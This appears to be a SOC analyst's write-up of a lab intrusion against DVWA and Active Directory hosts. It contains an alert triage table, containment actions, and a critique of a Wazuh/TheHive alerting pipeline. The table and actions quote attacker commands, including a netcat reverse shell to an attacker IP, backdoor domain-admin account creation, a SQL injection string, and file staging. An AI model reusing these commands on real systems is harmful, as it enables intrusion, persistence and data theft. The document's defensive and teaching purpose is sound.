-| # | IST Time | Verbatim TheHive Alert Title | Host / Sensor | TheHive Sev | Real Priority | Verdict | Key Evidence & Next Verification Step |
-|---|----------|------------------------------|-------------|-------------|---------------|---------|----------------------------------------|
-| #01 | 17:10:09 | [2x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Nmap SYN probe (`src_port: 34938`) to closed port 4444 (`pkts_toclient: 0`). |
-| #02 | 17:10:09 | [TOOL:unknown-scanner x17] [Suricata] 192.168.232.135 | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | **Unbounded 69m bundle** (`17:10:09 – 18:19:03 IST`) across ports 22, 80, 1433, 1521, 3306, 3389, 5432, 5815. |
-| #03 | 17:10:09 | [TOOL:Nmap x3] [Suricata] 192.168.232.135 | Suricata | High | Low (P4) | **Confirmed TP (Recon)** | Signatures POSSBL PORT SCAN (NMAP -sS) & ET SCAN NMAP OS Detection Probe (`86601`). |
-| #04 | 17:12:05 | [2x] [DVWA] DVWA: Multiple 400 errors - [404] [192.168.232.135] [/udOIY0cZ.fhp] | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | Two 404 hits on nonsense `/udOIY0cZ.fhp` path (Nikto fuzzer check, rule `31151`). |
-| #05 | 17:12:08 | [1x] [Suricata] Suricata: High-volume HTTP 4xx burst from 192.168.232.135... | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | Rule `100410` flagging >100 in 60s HTTP 4xx Nikto enumeration burst. |
-| #06 | 17:12:08 | [5x] [DVWA] Shellshock attack detected | DVWA | Critical | Low (P4) | **Confirmed FP (Exploit)** | Nikto `93e4r0-CVE-2014-6271: true` canary header on PHP pages; no execution. |
-| #07 | 17:12:09 | [16x] [DVWA] Multiple common web attacks from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 16 Nikto probes (rule `31153`), including buried `rfiinc.txt%00` RFI test (404). |
-| #08 | 17:12:09 | [WATCHLIST x14: passwd] [DVWA] 192.168.232.135 | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 14 Nikto path-traversal probes matching passwd watchlist (rule `31153`, all failed). |
-| #09 | 17:12:10 | [26x] [DVWA] Multiple XSS (Cross Site Scripting) attempts from same source ip. | DVWA | Medium | Low (P4) | **Confirmed TP (Recon)** | 26 Nikto XSS probes (rule `31154`), all unauthenticated/failed. |
-| #10 | 17:12:16 | [4x] [Suricata] Suricata: Alert - GPL EXPLOIT unicode directory traversal attempt | Suricata | Medium | Low (P4) | **Confirmed TP (Recon)** | 4 Nikto `%2e%2e/` traversal probes (rule `86601`). |
-| #11 | 17:18:02 | [22x] [Suricata] Suricata: [200] [192.168.232.135] [/login.php] [ET INFO User-Agent...] | Suricata | Medium | Critical (P1) | **Suspected Brute-Force / Confirmed SQLi & Upload** | 14 GET /login.php -> 2 GET /index.php (pull host auth log to confirm POST); 1 UNION SELECT SQLi (Alert 17); shell.php upload & ?cmd=id (Alert 18–22). |
-| #12 | 17:21:53 | [FANOUT x1] [DVWA] parent PID 17550 | DVWA | Medium | High (P2) | **Confirmed TP (RCE)** | Host auditd logs `uid=33` (www-data) executing `/usr/bin/id`. |
-| #13 | 17:21:58 | [1x] [Suricata] Suricata: Alert - ET ATTACK_RESPONSE Output of id command... | Suricata | Medium | High (P2) | **Confirmed TP (RCE)** | HTTP response returning `uid=33(www-data)` to 192.168.232.135. |
-| #14 | 17:24:03 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Critical (P1) | **Confirmed TP (Shell)** | Live reverse shell flow `192.168.56.30:47946 -> 192.168.232.135:4444`. |
-| #15 | 17:24:03 | [FANOUT x1] [DVWA] parent PID 17562 | DVWA | Medium | Critical (P1) | **Confirmed TP (Shell)** | Host auditd logs `/usr/bin/nc.openbsd` (`mkfifo /tmp/f...nc 192.168.232.135 4444`). |
-| #16 | 17:29:43 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | Critical (P1) | **Confirmed TP (Root SSH)** | `Accepted publickey for root from 192.168.232.135 port 36488 ssh2: ED25519 SHA256:sMGVpOuq...` |
-| #17 | 17:30:49 | [TOOL:Nmap x9] [Suricata] 192.168.56.30 | Suricata | High | High (P2) | **Confirmed TP (Pivot Scan)** | Signatures POSSBL PORT SCAN (NMAP -sS) & (NMAP -sX) across ports 1, 111, 199, 31768, 443, 995. |
-| #18 | 17:30:51 | [5x] [Suricata] Suricata: Alert - POSSBL SCAN SHELL M-SPLOIT TCP | Suricata | Medium | Info (P4) | **FP (Shell)** | Triggered when DVWA's internal Nmap scan probed port 4444. |
-| #19 | 17:32:16 | [TOOL:unknown-scanner x14] [Suricata] 192.168.56.30 | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Scan)** | 14 hits of ET SCAN Potential SSH Scan OUTBOUND on port 22 from 192.168.56.30. |
-| #20 | 17:34:27 | [4x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 4 succeeded root SSH publickey events from 192.168.232.135. |
-| #21 | 17:39:46 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events from 192.168.232.135. |
-| #22 | 18:01:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events 16s before GoldenPac alert #23. |
-| #23 | 18:01:18 | [1x] [Suricata] Suricata: Alert - ET EXPLOIT Possible GoldenPac Priv Esc in-use | Suricata | Medium | Critical (P1) | **Suspected / High-Confidence TP** | Flow `192.168.56.30:33986 -> 192.168.56.10:88` (krb5); pattern-consistent with MS14-068 (pull PCAP to verify PAC). |
-| #24 | 18:03:52 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (Root SSH)** | 2 succeeded root SSH publickey events on DVWA. |
-| #25 | 18:04:47 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | Rule `100613`: Impacket wmiexec detected (AD\Administrator, `cd \` & `cd`). |
-| #26 | 18:05:43 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
-| #27 | 18:06:53 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) session init (`cd \` & `cd`) on PC-DC.ad.lab. |
-| #28 | 18:07:26 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC WMI)** | wmiexec.py (PID 4432) runs `whoami` and `hostname` on PC-DC.ad.lab. |
-| #29 | 18:08:21 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Backdoor)** | Runs `net user backdoor P@ssw0rd123! /add`, `net localgroup Administrators backdoor /add`, and failed curly-quote `net group "Domain Admins"`. |
-| #30 | 18:08:22 | [3x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (User Added)** | Rule `60109` (Event IDs 4720/4722/4738) confirming AD\backdoor creation. |
-| #31 | 18:08:27 | [1x] [DomainWin10] Logon activity: ADMINISTRATORS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Admin Group)** | Rule `60154` (Event ID 4732) confirming CN=backdoor added to Administrators. |
-| #32 | 18:09:05 | [FANOUT x3] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DomAdmin Cmd)** | Runs ASCII-quote `net group "Domain Admins" backdoor /add`, `net user backdoor /passwordchg:no`, and `net user backdoor`. |
-| #33 | 18:09:05 | [1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local | DomainWin10 | High | Critical (P1) | **Confirmed TP (Domain Admin)** | Rule `60159` (Event ID 4728) confirming CN=backdoor added to Domain Admins. |
-| #34 | 18:09:28 | [2x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | High (P2) | **Confirmed TP (Policy Lock)** | Rule `60110` (Event ID 4738) confirming `/passwordchg:no` applied to backdoor. |
-| #35 | 18:13:58 | [FANOUT x2] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | High (P2) | **Confirmed TP (AD Staging)** | Dumps `net user /domain > C:\Windows\Temp\domain_users.txt` & `whoami /all > admin_info.txt`. |
-| #36 | 18:14:58 | [FANOUT x3] [Win10User] parent PID 4008 | Win10User | Medium | High (P2) | **Confirmed TP (Lateral)** | wmiexec.py (PID 4008) on Win10.ad.lab runs `type C:\Users\win10\Documents\Sensitive\* > C:\Windows\Temp\sensitive_data.txt`. |
-| #37 | 18:17:30 | [6x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 6 rapid root SSH logins on DVWA (session re-establishment; no scp/sftp indicator in log). |
-| #38 | 18:19:02 | [2x] [DVWA] Logon activity: ROOT @ 192.168.232.135 | DVWA | Medium | High (P2) | **Confirmed TP (SSH Reconnect)** | 2 root SSH logins on DVWA 47s before launching Window 6 impact commands. |
-| #39 | 18:19:49 | [FANOUT x9] [DomainWin10] parent PID 4432 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (DC Impact)** | Consolidated 9-step batch: copies hacked.bmp to `C:\Users\Public\`, runs 2 reg add wallpaper commands, writes README_HACKED.txt & .enc files to `C:\Users\Administrator\Desktop\`, runs `shutdown /r /t 0`. |
-| #40 | 18:20:05 | [FANOUT x1] [DomainWin10] parent PID 6500 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #39). |
-| #41 | 18:20:11 | [FANOUT x1] [DomainWin10] parent PID 4980 | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Child of #39)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #39). |
-| #42 | 18:23:59 | [FANOUT x9] [Win10User] parent PID 4008 | Win10User | Medium | Critical (P1) | **Confirmed TP (Win10 Impact)** | Consolidated 9-step batch on Win10User: copies hacked.bmp, runs 2 reg add commands, writes README_HACKED.txt & .enc files to `C:\Users\win10\Desktop\`, runs `shutdown /r /t 0`. |
-| #43 | 18:23:59 | [3x] [Suricata] Suricata: Alert - ET INFO NTLM Session Setup Request - Negotiate | Suricata | Medium | High (P2) | **Confirmed TP (Pivot Context)** | NTLM Negotiate/Challenge/Auth (`192.168.56.30:32922 <-> 192.168.56.20:445`); supporting context for DVWA -> Win10 pivot. |
-| #44 | 18:24:12 | [FANOUT x1] [Win10User] parent PID 1724 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 4 inside #42). |
-| #45 | 18:24:18 | [FANOUT x1] [Win10User] parent PID 3880 | Win10User | Medium | Critical (P1) | **Confirmed TP (Child of #42)** | Rule `92041` child alert triggered by reg.exe (Alert 5 inside #42). |
-| #46 | 18:36:34 | [1x] [DomainWin10] Logon activity: BACKDOOR @ local | DomainWin10 | Medium | Critical (P1) | **Confirmed TP (Live Backdoor)** | Post-reboot Event ID 4738 check (rule `60110`) confirming AD\backdoor survived reboot. |
-
----
-
-# 4. Immediate Containment Actions & Why I Am Taking Each One Right Now
-
-Before I start a deep forensic investigation to write up Cases 01, 02, and 03, I have to **lock the attacker out**. If I leave their Critical (P1) footholds open while I spend hours analyzing logs, they can log right back in, wipe evidence, or deploy real ransomware. Even more importantly, **the sequence of containment matters**: if I delete their webshell or AD\backdoor account before cutting off their network access, the attacker can see my cleanup in real time and plant a second hidden backdoor.
-
-## 🛡️ Action 1: Block Attacker IP 192.168.232.135 at the Firewall & Cut DVWA's Internal Pivot Bridge (192.168.56.30)
-
-### Why I am doing this first (The Reasoning):
-
-Every external attack in the queue—from the python-requests session (#11) and the port 4444 reverse shell (#14 – #15) to all root SSH logins (#16, #20 – #22, #24, #37, #38)—originated from `192.168.232.135`. Alerts #17 (Internal Nmap), #19 (Outbound SSH Scan), #23 (Kerberos traffic `.56.30 -> .56.10:88`), and #43 (NTLM Session Setup `.56.30 <-> .56.20:445`) show that **DVWA (`192.168.56.30`) is acting as the internal jump box into Active Directory**.
-
-### What I am executing immediately:
-
-- **Block all inbound and outbound traffic to/from `192.168.232.135`** at the perimeter firewall (especially TCP `:22` SSH, `:80` HTTP, and `:4444`).
-- **Isolate DVWA (`192.168.56.30`)** by blocking outbound connections from `.56.30` to `192.168.56.10` (PC-DC) and `192.168.56.20` (Win10) on ports `:88` (Kerberos), `:445` (SMB), and `:135` (RPC/WMI). This blinds the attacker immediately before I touch a single file on the hosts.
-
-## 🛡️ Action 2: Remove the Rogue Root SSH Key, Kill Live Shells & Quarantine shell.php on DVWA (192.168.56.30)
-
-### Why I am doing this (The Reasoning):
-
-On DVWA, the attacker established **three independent ways in**. If I only delete shell.php, they can still log straight in as root via SSH (#16) or use their open Netcat shell (#15). Conversely, if I only remove the SSH key, they can re-run commands through shell.php (#11). **I must close all three simultaneously while preserving copies for forensic analysis.**
-
-### What I am executing on DVWA:
-
-- **Remove Root SSH Persistence (#16):** Copy `/root/.ssh/authorized_keys` to `/root/forensics_authorized_keys.bak` (preserving metadata/timestamps for Case 01), then delete the line containing `ED25519 SHA256:sMGVpOuqXdgB9Cqa5JCKAmoz51G5mwbkEUAxSngg4hE`.
-- **Kill Active Attacker Processes (#14 – #15):** Terminate any active `sshd: root@...` sessions from `192.168.232.135` (such as port 36488), kill any `/usr/bin/nc.openbsd` (`nc 192.168.232.135 4444`) or `/bin/sh -i` processes, and remove the named pipe `rm -f /tmp/f`.
-- **Quarantine the Webshell (#11):** Move `/var/www/html/hackable/uploads/shell.php` out of the web root to `/root/forensics_shell.php.quarantine` (`chmod 000`) so Apache (www-data) can no longer execute `?cmd=` requests.
-
-## 🛡️ Action 3: Disable AD\backdoor, Strip Its Admin Groups & Twice-Reset krbtgt on DomainWin10 (192.168.56.10)
-
-### Why I am doing this (The Reasoning):
-
-**Why I disable AD\backdoor instead of deleting it (#29 – #34, #46):** If I run `net user backdoor /del` right now, Active Directory deletes the user object and its SID (`S-1-5-21-...-4192`) before I finish correlating Velociraptor and Security Event logs. By disabling AD\backdoor and removing it from Domain Admins and Administrators, I revoke its access 100% while preserving every forensic artifact.
-
-**Why resetting AD\Administrator alone is NOT enough (#23 GoldenPac & #25 wmiexec.py):** Because Alert #23 indicates high-confidence GoldenPac (MS14-068) Kerberos ticket forgery and #25 confirms wmiexec.py running as AD\Administrator, **any forged Kerberos Ticket-Granting Ticket (TGT) signed by krbtgt remains valid for up to 10 hours even if AD\Administrator's password is changed!** To invalidate all forged Kerberos tickets across the domain, I must reset the krbtgt password **twice** (since Active Directory keeps a 2-password history for krbtgt) and purge Kerberos ticket caches (`klist purge`).
-
-### What I am executing on PC-DC.ad.lab:
-
-```cmd
-net user backdoor /active:no /domain
-net group "Domain Admins" backdoor /del /domain
-net localgroup Administrators backdoor /del
-```
-
-*(Followed immediately by rotating AD\Administrator's password, resetting krbtgt twice, and running `klist purge`.)*
-
-## 🛡️ Action 4: Terminate WMI/SMB Sessions on Win10User (192.168.56.20) & Quarantine Staged Files on Both Windows Hosts
-
-### Why I am doing this (The Reasoning):
-
-In Alerts #35 and #36, the attacker dumped sensitive AD and workstation data into `C:\Windows\Temp\domain_users.txt`, `admin_info.txt`, and `sensitive_data.txt`. And in #39 and #42, they copied hacked.bmp to `C:\Users\Public\hacked.bmp`, modified `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle), and wrote README_HACKED.txt, documents.enc, and passwords.enc onto `C:\Users\Administrator\Desktop\` (on the DC) and `C:\Users\win10\Desktop\` (on Win10User).
-
-### What I am executing:
-
-- Kill any lingering `WmiPrvSE.exe` child `cmd.exe` processes (parent PID 4432 on DC, parent PID 4008 on Win10)
-- Close active SMB sessions (`net session /delete`)
-- Move the staged `.txt`, `C:\Users\Public\hacked.bmp`, `README_HACKED.txt`, and `.enc` files into a secure forensic evidence folder
-- Restore `HKCU\Control Panel\Desktop` (Wallpaper and WallpaperStyle)
-
-## 🛡️ Action 5: Rotate DVWA Web Application & Database Passwords (#11)
-
-### Why I am doing this (The Reasoning):
-
-Because the attacker dumped the MySQL `users` table via `UNION SELECT user, password FROM users-- -` (Alert 17 in #11) after the suspected `/login.php` brute-force (Alert 1 – 16), I must rotate all DVWA application passwords and MariaDB/MySQL database credentials before bringing the web application back online.
-
----
-
-# 5. Analyst Critique of Our Alert Creation Pipeline (custom-thehive.py & Wazuh Rules): 8 Flaws to Fix
-
-Reviewing these 46 alerts as an analyst exposed **eight major engineering flaws** in how our lab (`custom-thehive.py`, Wazuh `local_rules.xml`, and Suricata) currently generates, titles, tags, and prioritizes alerts in TheHive:
-
-## ⚠️ Flaw 1: Upside-Down Severity Mapping (Scanner Noise Marked Critical, Active Breaches Marked Medium)
-
-### What went wrong:
-
-Our pipeline maps Wazuh `rule.level` directly to TheHive severity using static thresholds (`level >= 12` → Critical, `9–11` → High, `5–8` → Medium). Because default rules assign level 5–8 to Impacket wmiexec detected (`100613`), Linux auditd (`80792`), SSH logins (`5715`), and Suricata exploit/response rules (`86601`), **the worst attacks in the entire incident were buried as Medium**:
-
-- **False Critical / High:** Failed Nikto Shellshock header (#06 = Critical) and external Nmap scan (#03 = High).
-- **False Medium (Should be Critical):** Web SQLi + shell.php upload (#11), Netcat reverse shell (#14 – #15), root SSH login from attacker IP (#16), GoldenPac DC exploit (#23), wmiexec.py on DC (#25 – #29, #32), BACKDOOR user creation (#30), and simulated ransomware + forced reboots (#39 – #45).
-
-### How to fix it:
-
-Promote Wazuh rule `100613` (Impacket wmiexec detected), `mkfifo / nc.openbsd` reverse shells, ET EXPLOIT GoldenPac, Event ID 4720 (`60109` add_user on DC), and `shutdown /r` / `.enc` file drops to **Critical (Sev 4)**, and downgrade unauthenticated scanner 404 / 400 bursts to **Low (Sev 1)**.
-
-## ⚠️ Flaw 2: Missing [TOOL:...] Detection Tags (Only Nmap Was Named; Everything Else Was Missed or Tagged unknown-scanner)
-
-### What went wrong:
-
-While #03 and #17 were tagged `[TOOL:Nmap]`, #02 and #19 were tagged `[TOOL:unknown-scanner]`, and the pipeline failed to tag `[TOOL:...]` on the other attack tools even when Wazuh/Suricata already knew the tool name:
-
-- **Missed [TOOL:Nikto] (#04 – #10):** Raw HTTP logs explicitly contained `Mozilla/5.00 (Nikto/2.1.6)`.
-- **Missed [TOOL:Impacket-wmiexec] (#25 – #29, #32, #35, #36, #39, #42):** Inside the description, Wazuh rule `100613` literally says **Impacket wmiexec detected**, yet `custom-thehive.py` overwrote the alert title with `[FANOUT x...] parent PID 4432` and dropped the Impacket wmiexec label from the title!
-- **Missed [TOOL:Impacket-GoldenPac] (#23) & [TOOL:Netcat] (#15).**
-
-### How to fix it:
-
-Update `custom-thehive.py` so `[FANOUT]` title formatting preserves high-value rule names like Impacket wmiexec detected (`[TOOL:Impacket-wmiexec]`) and matches `Nikto/2.1.6` in `http_user_agent`.
-
-## ⚠️ Flaw 3: Misleading & Opaque Alert Titles ([FANOUT] parent PID & Group-Name Inversion)
-
-### What went wrong:
-
-- **[FANOUT x...] parent PID 4432 Hides Impacket wmiexec and the Executed Commands (#12, #15, #25 – #29, #32, #35, #36, #39 – #42, #44 – #45):** Seventeen alerts in the queue have titles like `[FANOUT x2] [DomainWin10] parent PID 4432` or `[FANOUT x1] [DVWA] parent PID 17562`. That tells an analyst nothing at first glance, even though the underlying events contain the exact binary (`/usr/bin/nc.openbsd`, `/usr/bin/id`, `reg.exe`) and the exact `commandLine`!
-- **Windows Group Changes Show the Group Name Instead of the Added User (#31, #33):** `[1x] [DomainWin10] Logon activity: DOMAIN ADMINS @ local` pulls `targetUserName` (DOMAIN ADMINS) instead of `memberName` (CN=backdoor).
-
-### How to fix it:
-
-Include `distinct_images` and the first/highest-severity `commandLine` in `[FANOUT]` titles, and format 4728 / 4732 titles as `Group Change: Added <memberName> to <targetUserName>`.
-
-## ⚠️ Flaw 4: Over-Broad Alert Grouping (#11 Buried 4 Kill-Chain Stages Under a GET /login.php Title)
-
-### What went wrong:
-
-In Alert #11, `custom-thehive.py` bundled 22 events across almost 4 minutes (`17:18:02` to `17:21:54 IST`) because they all fired Wazuh wrapper rule `100600`, and named the entire bundle after the very first event (`[200] [192.168.232.135] [/login.php] [ET INFO User-Agent (python-requests)]`). That buried **ET WEB_SERVER SELECT USER SQL Injection Attempt in URI** (Alert 17), **ET WEB_SERVER PHP System Command in HTTP POST** (Alert 20 – 21), and **ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)** (Alert 22) inside an informational User-Agent alert!
-
-### How to fix it:
-
-Group Suricata web alerts by `(src_ip, alert.signature_id)` rather than wrapper rule `100600`, and always title/score a bundle using its **highest-severity signature**.
-
-## ⚠️ Flaw 5: Broken Auto-Tagging (T1047 WMI on Linux SSH & stages:N Event Counters)
-
-### What went wrong:
-
-Whenever `process_fanout` or multi-event grouping triggered, `custom-thehive.py` attached MITRE **T1047** (Windows Management Instrumentation) even to Ubuntu Linux sshd / auditd events and Windows Event ID 4738 account modifications, and used `stages:N` (`stages:22`, `stages:16`) to represent the sub-event hit count rather than kill-chain stage numbers.
-
-### How to fix it:
-
-Restrict T1047 strictly to Windows events where `parentImage` / `parentProcessName` is `WmiPrvSE.exe`, and rename `stages:N` to `events:N` or `hits:N`.
-
-## ⚠️ Flaw 6: Host & Network Visibility Blind Spots (Linux Privesc & Initial DC SMB Pivot)
-
-### What went wrong:
-
-- **Zero alerts fired during the 5m 40s Linux privilege escalation gap** (`17:24:03 – 17:29:43 IST`) where www-data escalated to root and wrote `/root/.ssh/authorized_keys`
-- **Zero Suricata alerts fired when DVWA first connected to PC-DC:445** to launch wmiexec.py at `18:04:47 IST`
-
-### How to fix it:
-
-Add auditd `euid=0` privesc rules + Wazuh `realtime="yes"` FIM on `/root/.ssh/authorized_keys`, and ensure Suricata monitors `.56.30 <-> .56.10:445`.
-
-## ⚠️ Flaw 7: No Visibility into POST-Based Login Activity on /login.php (Alert #11)
-
-### What went wrong:
-
-Every event tied to the credential-access attempt in Alert #11 logs as **GET** under Suricata rule `100600`, which matches on User-Agent (python-requests) rather than HTTP method or request body. If the actual brute-force traffic went over POST—the far more likely mechanism for submitting credentials—this pipeline has no rule capturing it, and the alert queue alone cannot confirm what credential pair was submitted or whether authentication succeeded.
-
-### How to fix it:
-
-Add a dedicated detection rule keyed on **POST /login.php** with response-size, `302` redirect `Location`, or session-cookie heuristics, and ingest DVWA's own host-side Apache access/application auth logs into Wazuh so credential-access attempts aren't solely dependent on Suricata's network-layer User-Agent view.
-
-## ⚠️ Flaw 8: Unbounded Alert Correlation Time Window (Alert #02 Absorbed Sub-Events for 69 Minutes)
-
-### What went wrong:
-
-Alert #02's Time span metadata (`17:10:09.913 IST` → `18:19:03.500 IST`) shows that the correlation engine kept appending sub-events from `192.168.232.135` into this single "scanner" bundle for **69 minutes across the entire incident**—long after the webshell upload (#11), the Netcat reverse shell (#14 – #15), and the root SSH access (#16, #20 – #22, #24, #37, #38) had already occurred. Post-compromise traffic from the same source IP keeps being filed under a Window 1 recon alert, so an analyst working the queue by time window never sees that the same source remained active throughout the entire attack chain.
-
-### How to fix it:
-
-Bound the correlation window in `custom-thehive.py`: close a grouped alert after a fixed timeout (e.g., 5–10 minutes without new sub-events) and split the bundle whenever the gap between sub-events exceeds a threshold, so post-compromise activity from the same source lands in a fresh, correctly-prioritized alert instead of silently extending a stale scanner bundle.
 
 ---
 
